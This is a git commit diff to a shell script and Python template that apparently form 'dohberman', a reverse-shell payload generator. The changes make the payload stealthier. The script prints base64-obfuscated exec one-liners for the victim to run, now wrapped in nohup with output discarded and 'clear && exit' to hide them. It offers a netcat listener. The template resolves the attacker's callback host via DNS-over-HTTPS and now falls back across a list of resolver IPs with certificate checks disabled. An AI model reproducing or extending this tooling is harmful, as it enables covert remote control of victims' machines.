3233b8dd8830ef03643facfa239e65c074ab984d
thirdbyte <59290972+thirdbyte@users.noreply.github.com>
2021-06-26 14:00:00 +0530

    Updated

--- dohberman.sh
+++ dohberman.sh
@@ -10,13 +10,18 @@ payload=$(cat payload.py | base64 -w0)
 read -p "[*] PAYLOAD NAME       >>> " name
 echo "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('$payload')[0]))" > $name.py
 echo ""
-echo "[+] Transfer $name.py to the target and execute it using python."
+echo "[+] Transfer $name.py to the target and execute it using python:"
+echo "..."
+echo 'nohup python '"$name.py"' &>/dev/null & clear && exit'
+echo "..."
+echo ""
 echo "    OR"
+echo ""
 echo "[+] Execute the following on the target :"
 echo "..."
-echo -n 'python -c "'
+echo -n 'nohup python -c "'
 echo -n "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('$payload')[0]))"
-echo '"'
+echo '" &>/dev/null & clear && exit'
 echo "..."
 echo ""
 read -p "Do want to start netcat listener right away? (y/n) : " answer
--- template.py
+++ template.py
@@ -12,16 +12,27 @@ def listToString(s):
 host="REPL_HOST"
 port=REPL_PORT
 
-url = 'https://1.1.1.1/dns-query'
+ipls = ["1.1.1.1", "1.0.0.1", "1.1.1.2", "1.0.0.2", "1.1.1.3", "1.0.0.3", "46.239.223.80", "139.99.222.72", "5.2.75.75", "45.67.219.208", "45.79.120.233", "185.213.26.187", "45.132.75.16", "45.91.95.12", "45.132.74.167", "185.175.56.133", "193.29.62.196", "103.73.64.132"]
+
 client = requests.session()
 params = {
         'name': host,
         'type': 'A',
         'ct': 'application/dns-json'
 }
-data = client.get(url, params=params, verify=False)
-json_data = str(data.json())
 
+for ip in ipls:
+    try:
+        url = "https://"+ip+"/dns-query"
+        data = client.get(url, params=params, verify=False, timeout=1)
+    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
+        pass
+    except requests.exceptions.HTTPError:
+        pass
+    else:
+        break
+
+json_data = str(data.json())
 host = [match[0] for match in re.findall(ipv4, json_data)]
 host = listToString(host)
 
